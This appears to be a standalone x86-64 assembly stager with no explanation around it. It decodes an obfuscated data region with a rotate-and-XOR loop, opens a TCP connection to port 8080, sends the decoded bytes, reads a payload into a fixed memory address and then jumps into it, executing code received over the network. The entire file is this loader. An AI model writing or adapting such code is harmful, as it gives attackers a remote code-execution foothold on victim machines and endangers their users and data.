	.section .text

	.globl _start

_start:
	addq	$0xffffffffffffffe0,%rsp
	movq	$0x401078,%r8
	jmp	.L0
.L1:
	movb	(%r8),%r9b
	rolb	$4,%r9b
	xorb	$0x42,%r9b
	movb	%r9b,(%r8)
	addq	$1,%r8
.L0:
	cmpq	$0x4010a0,%r8
	jl	.L1
	movl	$0x29,%eax
	movl	$0x2,%edi
	movl	$0x1,%esi
	xorl	%edx,%edx
	syscall
	test	%eax,%eax
	je	.L2
	movl	%eax,0x18(%rsp)
	xorq	%rax,%rax
	pushq	%rax
	movq	$0x901f0002,%rax
	pushq	%rax
	movl	$0x2a,%eax
	movl	0x28(%rsp),%edi
	leaq	(%rsp),%rsi
	movl	$0x10,%edx
	syscall
	cmpl	$0xffffffff,%eax
	je	.L2
	movl	$1,%eax
	movl	0x28(%rsp),%edi
	movq	$0x401078,%rsi
	movl	$0x28,%edx
	syscall
	cmpl	$0x28,%eax
	jne	.L2
	movl	$0x7d,0x18(%rsp)
	movq	$0x401a00,0x10(%rsp)
.L4:
	xorl	%eax,%eax
	movl	0x28(%rsp),%edi
	movq	0x10(%rsp),%rsi
	movl	0x18(%rsp),%edx
	syscall
	test	%eax,%eax
	jle 	.L3
	addl	%eax,0x10(%rsp)
	subl	%eax,0x18(%rsp)
	jg	.L4
.L3:
	movl	$0x3,%eax
	movl	0x28(%rsp),%edi
	syscall
	movl	$0x401a4c,%eax
	call	*%rax
.L2:
	xorl	%edi,%edi
	addq	$0x30,%rsp
	movl	$0x3c,%eax
	syscall
